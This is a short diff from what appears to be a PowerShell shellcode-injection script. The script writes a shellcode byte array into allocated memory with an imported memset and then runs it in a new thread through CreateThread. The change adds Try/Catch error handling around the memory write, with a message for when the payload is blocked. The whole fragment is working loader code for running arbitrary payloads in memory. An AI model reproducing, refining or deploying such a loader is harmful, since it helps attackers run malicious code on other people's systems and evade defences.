@@ -41,8 +41,24 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) 
     {
         
-        $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
+        Try 
+        {
+        
+            $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
+        }  # End Try
+        Catch 
+        {
+
+            $Error[0]
+
+            Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
+
+            Pause
+
+            Exit
+
+        }  # End Catch 
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
